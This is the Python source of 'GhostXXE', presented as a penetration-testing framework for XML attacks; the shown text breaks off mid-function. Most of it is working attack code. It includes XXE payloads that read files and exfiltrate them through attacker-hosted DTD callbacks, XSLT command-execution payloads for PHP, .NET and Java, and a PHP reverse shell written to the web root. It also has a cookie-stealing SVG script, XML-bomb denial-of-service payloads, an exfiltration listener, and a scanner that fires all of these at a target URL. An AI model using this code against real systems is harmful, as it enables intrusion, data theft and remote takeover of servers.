#!/usr/bin/env python3
"""
GhostXXE - Advanced XML Exploitation Framework
Ghost Ops Security - Professional Penetration Testing Tool

Comprehensive XML External Entity (XXE) exploitation tool for web application security testing.
Includes discovery, exploitation, OOB data exfiltration, and reverse shell capabilities.

Author: Ghost Ops Security
Version: 2.0
"""

import argparse
import sys
import requests
import urllib3
import base64
import threading
import socket
import re
import time
import json
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, urljoin
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Dict, List, Tuple, Optional
from colorama import Fore, Back, Style, init

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)


class Colors:
    """Color definitions for terminal output"""
    HEADER = Fore.CYAN + Style.BRIGHT
    SUCCESS = Fore.GREEN + Style.BRIGHT
    WARNING = Fore.YELLOW + Style.BRIGHT
    ERROR = Fore.RED + Style.BRIGHT
    INFO = Fore.BLUE + Style.BRIGHT
    PAYLOAD = Fore.MAGENTA
    RESET = Style.RESET_ALL


class Banner:
    """Display tool banner"""
    @staticmethod
    def show():
        banner = f"""
{Colors.HEADER}
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║     ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗  ██╗██╗  ██╗███████╗║
║    ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝╚██╗██╔╝╚██╗██╔╝██╔════╝║
║    ██║  ███╗███████║██║   ██║███████╗   ██║    ╚███╔╝  ╚███╔╝ █████╗  ║
║    ██║   ██║██╔══██║██║   ██║╚════██║   ██║    ██╔██╗  ██╔██╗ ██╔══╝  ║
║    ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║   ██╔╝ ██╗██╔╝ ██╗███████╗║
║     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝║
║                                                                       ║
║                 Advanced XML Exploitation Framework v2.0              ║
║                      Ghost Ops Security - Red Team                    ║
║                                                                       ║
║         ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░          ║
║                                                                       ║
║  {Colors.SUCCESS}[+]{Colors.HEADER} XML External Entity (XXE) Discovery & Exploitation         ║
║  {Colors.SUCCESS}[+]{Colors.HEADER} XSLT & XPATH Injection Testing                            ║
║  {Colors.SUCCESS}[+]{Colors.HEADER} Out-of-Band (OOB) Data Exfiltration                       ║
║  {Colors.SUCCESS}[+]{Colors.HEADER} Reverse Shell & Interactive Command Execution              ║
║                                                                       ║
║         ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░          ║
║                                                                       ║
║              {Colors.WARNING}👻 Where Hackers Fear to Tread 👻{Colors.HEADER}                      ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
        print(banner)


class OOBServer(BaseHTTPRequestHandler):
    """Out-of-Band HTTP/FTP server for data exfiltration"""
    
    captured_data = []
    dtd_payload = ""
    
    def log_message(self, format, *args):
        """Custom logging"""
        pass
    
    def do_GET(self):
        """Handle GET requests"""
        print(f"\n{Colors.SUCCESS}[+] OOB Callback Received!{Colors.RESET}")
        print(f"{Colors.INFO}[*] Path: {self.path}{Colors.RESET}")
        print(f"{Colors.INFO}[*] Headers: {Colors.RESET}")
        for header, value in self.headers.items():
            print(f"    {header}: {value}")
        
        # Capture data from URL parameters
        if '?' in self.path:
            data = self.path.split('?')[1]
            print(f"\n{Colors.SUCCESS}[+] Exfiltrated Data:{Colors.RESET}")
            print(f"{Colors.PAYLOAD}{data}{Colors.RESET}")
            OOBServer.captured_data.append(data)
        
        # Serve DTD file if requested
        if self.path.endswith('.dtd'):
            self.send_response(200)
            self.send_header('Content-type', 'application/xml-dtd')
            self.end_headers()
            self.wfile.write(OOBServer.dtd_payload.encode())
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'OK')
    
    def do_POST(self):
        """Handle POST requests"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        print(f"\n{Colors.SUCCESS}[+] OOB POST Received!{Colors.RESET}")
        print(f"{Colors.INFO}[*] Path: {self.path}{Colors.RESET}")
        print(f"{Colors.SUCCESS}[+] Exfiltrated Data:{Colors.RESET}")
        print(f"{Colors.PAYLOAD}{post_data.decode('utf-8', errors='ignore')}{Colors.RESET}")
        OOBServer.captured_data.append(post_data.decode('utf-8', errors='ignore'))
        
        self.send_response(200)
        self.end_headers()


class PayloadGenerator:
    """Generate XXE, XSLT, and XPATH payloads"""
    
    @staticmethod
    def xxe_basic_file_read(file_path: str) -> List[str]:
        """Basic XXE file read payloads"""
        payloads = [
            # Standard XXE
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{file_path}"> ]>
<root>&xxe;</root>''',
            
            # Parameter entity
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file://{file_path}">
<!ENTITY callhome SYSTEM "file:///etc/hostname">
]>
<root>&callhome;</root>''',
            
            # PHP wrapper base64
            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}"> ]>
<root>&xxe;</root>''',
            
            # UTF-7 encoding
            f'''<?xml version="1.0" encoding="UTF-7"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{file_path}"> ]>
<root>&xxe;</root>'''
        ]
        return payloads
    
    @staticmethod
    def xxe_oob_http(callback_url: str, file_path: str) -> Tuple[str, str]:
        """Out-of-band XXE via HTTP"""
        dtd_payload = f'''<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '{callback_url}/?data=%file;'>">
%eval;
%exfiltrate;'''
        
        xml_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd"> %xxe;]>
<root></root>'''
        
        return xml_payload, dtd_payload
    
    @staticmethod
    def xxe_oob_ftp(callback_ip: str, file_path: str) -> Tuple[str, str]:
        """Out-of-band XXE via FTP"""
        dtd_payload = f'''<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://{callback_ip}:2121/?%file;'>">
%eval;
%exfiltrate;'''
        
        xml_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback_ip}/evil.dtd"> %xxe;]>
<root></root>'''
        
        return xml_payload, dtd_payload
    
    @staticmethod
    def xxe_error_based(file_path: str) -> str:
        """Error-based XXE for blind exploitation"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<root></root>'''
    
    @staticmethod
    def xxe_local_dtd_linux(file_path: str) -> str:
        """Local DTD exploitation for Linux"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file://{file_path}">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Test</message>'''
    
    @staticmethod
    def xxe_local_dtd_windows(file_path: str) -> str:
        """Local DTD exploitation for Windows"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "file:///{file_path}">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///t/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ENTITY test "test"'>
    %local_dtd;
]>
<foo>anything</foo>'''
    
    @staticmethod
    def xinclude_attack() -> str:
        """XInclude XXE attack"""
        return '''<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</root>'''
    
    @staticmethod
    def svg_xxe(callback_url: str, file_path: str) -> str:
        """SVG-based XXE"""
        return f'''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "{callback_url}/evil.dtd">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg">
<text x="15" y="100">XXE via SVG</text>
<flowRoot>
<flowRegion>
<rect x="0" y="0" width="200" height="200"/>
</flowRegion>
<flowDiv>
<flowPara>&exfil;</flowPara>
</flowDiv>
</flowRoot>
</svg>'''
    
    @staticmethod
    def soap_xxe(callback_url: str) -> str:
        """SOAP-based XXE"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<foo>
<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "{callback_url}/evil.dtd"> %dtd;]><xxx/>]]>
</foo>
</soap:Body>
</soap:Envelope>'''
    
    @staticmethod
    def xslt_rce_php() -> List[str]:
        """XSLT Remote Code Execution for PHP"""
        payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','/etc/passwd')" />
</body>
</html>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('system','id')" />
</body>
</html>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','cat /etc/passwd')" />
</xsl:template>
</xsl:stylesheet>'''
        ]
        return payloads
    
    @staticmethod
    def xslt_rce_dotnet() -> str:
        """XSLT Remote Code Execution for .NET"""
        return '''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts">
<msxsl:script language="C#" implements-prefix="user">
<![CDATA[
public string execute(){
    System.Diagnostics.Process proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName= "C:\\\\windows\\\\system32\\\\cmd.exe";
    proc.StartInfo.RedirectStandardOutput = true;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.Arguments = "/c whoami";
    proc.Start();
    proc.WaitForExit();
    return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>
<xsl:template match="/">
--- BEGIN OUTPUT ---
<xsl:value-of select="user:execute()"/>
--- END OUTPUT ---
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_file_read() -> str:
        """XSLT file read using document()"""
        return '''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:copy-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_ssrf(target_url: str) -> str:
        """XSLT SSRF payload"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:copy-of select="document('{target_url}')"/>
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xpath_injection_payloads() -> List[str]:
        """XPATH injection test payloads"""
        return [
            "' or '1'='1",
            "' or ''='",
            "x' or 1=1 or 'x'='y",
            "admin' or '1'='1",
            "' or 1=1--",
            "') or ('1'='1",
            "' or 1=1#",
            "1' or '1' = '1",
            "' or '1'='1'--",
            "' or 'a'='a"
        ]
    
    @staticmethod
    def xxe_reverse_shell_php(attacker_ip: str, attacker_port: int) -> Tuple[str, str]:
        """Generate PHP reverse shell via XXE"""
        php_reverse_shell = f'''<?php
$sock=fsockopen("{attacker_ip}",{attacker_port});
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>'''
        
        encoded_shell = base64.b64encode(php_reverse_shell.encode()).decode()
        
        # Payload to write the shell
        write_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/write=convert.base64-decode/resource=/var/www/html/shell.php">
]>
<root>{encoded_shell}</root>'''
        
        # Payload to execute the shell
        execute_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://localhost/shell.php">
]>
<root>&xxe;</root>'''
        
        return write_payload, execute_payload
    
    @staticmethod
    def xxe_expect_rce(command: str) -> str:
        """XXE with expect wrapper for RCE"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://{command}"> ]>
<root>&xxe;</root>'''
    
    @staticmethod
    def xxe_jar_protocol(jar_url: str) -> str:
        """XXE using JAR protocol"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "jar:{jar_url}!/test.txt">
]>
<root>&xxe;</root>'''
    
    # ═══════════════════════════════════════════════════════════════
    # ADVANCED PAYLOADS - Integrated from advanced_payloads.py
    # ═══════════════════════════════════════════════════════════════
    
    @staticmethod
    def xxe_jar_rce(jar_url: str) -> str:
        """JAR protocol exploitation (Java environments)"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "jar:{jar_url}!/META-INF/MANIFEST.MF">
]>
<root>&xxe;</root>'''
    
    @staticmethod
    def xxe_netdoc_protocol() -> str:
        """NetDoc protocol for Java (directory listing)"""
        return '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "netdoc:/etc/">
]>
<root>&xxe;</root>'''
    
    @staticmethod
    def xxe_gopher_ssrf(target_host: str, target_port: int, payload: str) -> str:
        """Gopher protocol for SSRF exploitation"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "gopher://{target_host}:{target_port}/_{payload}">
]>
<root>&xxe;</root>'''
    
    @staticmethod
    def xxe_data_uri_base64(data: str) -> str:
        """Data URI scheme with base64"""
        encoded = base64.b64encode(data.encode()).decode()
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "data:text/plain;base64,{encoded}">
]>
<root>&xxe;</root>'''
    
    @staticmethod
    def xxe_billion_laughs() -> str:
        """Billion Laughs DoS attack (XML bomb)"""
        return '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>'''
    
    @staticmethod
    def xxe_quadratic_blowup() -> str:
        """Quadratic Blowup DoS attack"""
        return '''<?xml version="1.0"?>
<!DOCTYPE kaboom [
<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>'''
    
    @staticmethod
    def xxe_utf7_bypass() -> str:
        """UTF-7 encoding for WAF bypass"""
        return '''+ADw?xml version="1.0" encoding="UTF-7"?+AD4
+ADw!DOCTYPE foo+AFs
+ADwAIQ-ENTITY xxe SYSTEM "file:///etc/passwd"+AD4
+AF0+AD4
+ADw-root+AD4AJg-xxe+ADs+ADw-/root+AD4'''
    
    @staticmethod
    def xslt_exsl_file_write(file_path: str, content: str) -> str:
        """XSLT file write using EXSLT"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:exsl="http://exslt.org/common"
extension-element-prefixes="exsl"
version="1.0">
<xsl:template match="/">
<exsl:document href="{file_path}" method="text">
{content}
</exsl:document>
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_java_runtime_exec(command: str) -> str:
        """XSLT Java Runtime.exec() exploitation"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
<xsl:template match="/">
<xsl:variable name="rtobject" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtobject,'{command}')"/>
<xsl:text>Command executed</xsl:text>
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_php_wrapper_include(file_path: str) -> str:
        """XSLT PHP wrapper for file inclusion"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','{file_path}')" />
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xslt_xss_payload() -> str:
        """XSLT XSS injection"""
        return '''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<body>
<script>alert('XSS via XSLT')</script>
</body>
</html>
</xsl:template>
</xsl:stylesheet>'''
    
    @staticmethod
    def xpath_blind_boolean_injection(condition: str, position: int) -> str:
        """Blind XPATH boolean injection"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<query>admin' and substring(password,{position},1)='{condition}</query>
</root>'''
    
    @staticmethod
    def xpath_union_injection() -> str:
        """XPATH union-based injection"""
        return '''<?xml version="1.0" encoding="UTF-8"?>
<root>
<query>' | //user/password | '</query>
</root>'''
    
    @staticmethod
    def xpath_count_injection() -> str:
        """XPATH count() function injection"""
        return '''<?xml version="1.0" encoding="UTF-8"?>
<root>
<query>' or count(//user)>0 or ''='</query>
</root>'''
    
    @staticmethod
    def docx_xxe_payload(callback_url: str) -> dict:
        """Generate DOCX with XXE payload"""
        document_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p>
<w:r>
<w:t>XXE Test Document</w:t>
</w:r>
</w:p>
</w:body>
</w:document>'''
        return {
            'document.xml': document_xml,
            'instructions': 'Inject this into word/document.xml inside the DOCX ZIP'
        }
    
    @staticmethod
    def xlsx_xxe_payload(callback_url: str) -> dict:
        """Generate XLSX with XXE payload"""
        sheet_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData>
<row r="1">
<c r="A1" t="s">
<v>0</v>
</c>
</row>
</sheetData>
</worksheet>'''
        return {
            'sheet1.xml': sheet_xml,
            'instructions': 'Inject this into xl/worksheets/sheet1.xml inside the XLSX ZIP'
        }
    
    @staticmethod
    def pptx_xxe_payload(callback_url: str) -> dict:
        """Generate PPTX with XXE payload"""
        slide_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:cSld>
<p:spTree>
<p:sp>
<p:txBody>
<a:p>
<a:r>
<a:t>XXE in PowerPoint</a:t>
</a:r>
</a:p>
</p:txBody>
</p:sp>
</p:spTree>
</p:cSld>
</p:sld>'''
        return {
            'slide1.xml': slide_xml,
            'instructions': 'Inject this into ppt/slides/slide1.xml inside the PPTX ZIP'
        }
    
    @staticmethod
    def svg_xxe_rce(callback_url: str, command: str) -> str:
        """SVG with XXE for RCE"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<text x="10" y="20">XXE RCE Test</text>
<script type="text/javascript">
<![CDATA[
var img = new Image();
img.src = "{callback_url}/exfil?data=" + btoa(document.cookie);
]]>
</script>
</svg>'''
    
    @staticmethod
    def rss_xxe(callback_url: str) -> str:
        """RSS feed with XXE"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE rss [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
<rss version="2.0">
<channel>
<title>XXE RSS Feed</title>
<link>{callback_url}</link>
<description>Test</description>
<item>
<title>Test Item</title>
<description>&exfil;</description>
</item>
</channel>
</rss>'''
    
    @staticmethod
    def atom_xxe(callback_url: str) -> str:
        """Atom feed with XXE"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feed [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
<feed xmlns="http://www.w3.org/2005/Atom">
<title>XXE Atom Feed</title>
<link href="{callback_url}"/>
<entry>
<title>Test</title>
<content>&exfil;</content>
</entry>
</feed>'''
    
    @staticmethod
    def wsdl_xxe(callback_url: str) -> str:
        """WSDL with XXE"""
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE definitions [
<!ENTITY % xxe SYSTEM "{callback_url}/evil.dtd">
%xxe;
]>
<definitions xmlns="http://schemas.xmlsoap.org/wsdl/"
xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/">
<service name="XXEService">
<port name="XXEPort" binding="tns:XXEBinding">
<soap:address location="{callback_url}"/>
</port>
</service>
</definitions>'''


class XXEScanner:
    """Main XXE scanning and exploitation engine"""
    
    def __init__(self, args):
        self.target_url = args.url
        self.callback_url = args.callback
        self.callback_ip = args.callback_ip
        self.callback_port = args.callback_port or 8080
        self.method = args.method.upper()
        self.headers = self._parse_headers(args.headers)
        self.cookies = self._parse_cookies(args.cookies)
        self.param = args.param
        self.file_path = args.file
        self.timeout = args.timeout
        self.proxy = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
        self.verbose = args.verbose
        self.session = requests.Session()
        self.vulnerabilities_found = []
        
    def _parse_headers(self, headers_str: str) -> Dict:
        """Parse custom headers"""
        headers = {}
        if headers_str:
            for header in headers_str.split(','):
                if ':' in header:
                    key, value = header.split(':', 1)
                    headers[key.strip()] = value.strip()
        return headers
    
    def _parse_cookies(self, cookies_str: str) -> Dict:
        """Parse cookies"""
        cookies = {}
        if cookies_str:
            for cookie in cookies_str.split(';'):
                if '=' in cookie:
                    key, value = cookie.split('=', 1)
                    cookies[key.strip()] = value.strip()
        return cookies
    
    def send_payload(self, payload: str, description: str = "") -> Optional[requests.Response]:
        """Send XXE payload to target"""
        try:
            if self.verbose:
                print(f"\n{Colors.INFO}[*] Testing: {description}{Colors.RESET}")
                print(f"{Colors.PAYLOAD}[*] Payload:\n{payload}{Colors.RESET}")
            
            headers = self.headers.copy()
            headers['Content-Type'] = 'application/xml'
            
            if self.method == 'GET':
                params = {self.param: payload} if self.param else {}
                response = self.session.get(
                    self.target_url,
                    params=params,
                    headers=headers,
                    cookies=self.cookies,
                    timeout=self.timeout,
                    proxies=self.proxy,
                    verify=False
                )
            else:  # POST
                response = self.session.post(
                    self.target_url,
                    data=payload,
                    headers=headers,
                    cookies=self.cookies,
                    timeout=self.timeout,
                    proxies=self.proxy,
                    verify=False
                )
            
            if self.verbose:
                print(f"{Colors.INFO}[*] Response Status: {response.status_code}{Colors.RESET}")
                print(f"{Colors.INFO}[*] Response Length: {len(response.text)}{Colors.RESET}")
            
            return response
            
        except requests.exceptions.RequestException as e:
            print(f"{Colors.ERROR}[-] Request failed: {str(e)}{Colors.RESET}")
            return None
    
    def detect_xxe_basic(self) -> bool:
        """Detect basic XXE vulnerability"""
        print(f"\n{Colors.HEADER}[*] Testing Basic XXE (File Read){Colors.RESET}")
        
        test_files = [
            '/etc/passwd',
            '/etc/hostname',
            'C:\\Windows\\win.ini',
            'C:\\boot.ini'
        ]
        
        for file_path in test_files:
            payloads = PayloadGenerator.xxe_basic_file_read(file_path)
            
            for idx, payload in enumerate(payloads, 1):
                response = self.send_payload(
                    payload,
                    f"Basic XXE #{idx} - {file_path}"
                )
                
                if response and self._check_xxe_response(response, file_path):
                    print(f"{Colors.SUCCESS}[+] XXE Vulnerability Detected!{Colors.RESET}")
                    print(f"{Colors.SUCCESS}[+] Successfully read: {file_path}{Colors.RESET}")
                    print(f"\n{Colors.INFO}[*] Response Preview:{Colors.RESET}")
                    print(response.text[:500])
                    
                    self.vulnerabilities_found.append({
                        'type': 'Basic XXE - File Read',
                        'payload': payload,
                        'file': file_path
                    })
                    return True
        
        print(f"{Colors.WARNING}[-] Basic XXE not detected{Colors.RESET}")
        return False
    
    def _check_xxe_response(self, response: requests.Response, file_path: str) -> bool:
        """Check if response indicates successful XXE"""
        indicators = [
            'root:',  # /etc/passwd
            'localhost',  # /etc/hostname
            'for 16-bit app support',  # win.ini
            '[boot loader]',  # boot.ini
            '<?xml',
            'bin/bash',
            'nologin'
        ]
        
        response_text = response.text.lower()
        return any(indicator.lower() in response_text for indicator in indicators)
    
    def detect_xxe_error_based(self) -> bool:
        """Detect error-based blind XXE"""
        print(f"\n{Colors.HEADER}[*] Testing Error-Based XXE{Colors.RESET}")
        
        test_files = ['/etc/passwd', '/etc/hostname']
        
        for file_path in test_files:
            payload = PayloadGenerator.xxe_error_based(file_path)
            response = self.send_payload(payload, f"Error-based XXE - {file_path}")
            
            if response and ('parse error' in response.text.lower() or 
                           'xml' in response.text.lower() or
                           file_path in response.text):
                print(f"{Colors.SUCCESS}[+] Error-Based XXE Vulnerability Detected!{Colors.RESET}")
                print(f"{Colors.INFO}[*] Error message may contain file contents{Colors.RESET}")
                print(f"\n{Colors.INFO}[*] Response:{Colors.RESET}")
                print(response.text[:500])
                
                self.vulnerabilities_found.append({
                    'type': 'Error-Based XXE',
                    'payload': payload,
                    'file': file_path
                })
                return True
        
        print(f"{Colors.WARNING}[-] Error-based XXE not detected{Colors.RESET}")
        return False
    
    def detect_xxe_local_dtd(self) -> bool:
        """Detect local DTD-based XXE"""
        print(f"\n{Colors.HEADER}[*] Testing Local DTD XXE{Colors.RESET}")
        
        # Test Linux DTD
        linux_payload = PayloadGenerator.xxe_local_dtd_linux('/etc/passwd')
        response = self.send_payload(linux_payload, "Local DTD XXE - Linux")
        
        if response and self._check_xxe_response(response, '/etc/passwd'):
            print(f"{Colors.SUCCESS}[+] Local DTD XXE (Linux) Detected!{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'Local DTD XXE - Linux',
                'payload': linux_payload
            })
            return True
        
        # Test Windows DTD
        windows_payload = PayloadGenerator.xxe_local_dtd_windows('C:\\Windows\\win.ini')
        response = self.send_payload(windows_payload, "Local DTD XXE - Windows")
        
        if response and ('for 16-bit' in response.text.lower()):
            print(f"{Colors.SUCCESS}[+] Local DTD XXE (Windows) Detected!{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'Local DTD XXE - Windows',
                'payload': windows_payload
            })
            return True
        
        print(f"{Colors.WARNING}[-] Local DTD XXE not detected{Colors.RESET}")
        return False
    
    def detect_xinclude(self) -> bool:
        """Detect XInclude vulnerability"""
        print(f"\n{Colors.HEADER}[*] Testing XInclude XXE{Colors.RESET}")
        
        payload = PayloadGenerator.xinclude_attack()
        response = self.send_payload(payload, "XInclude XXE")
        
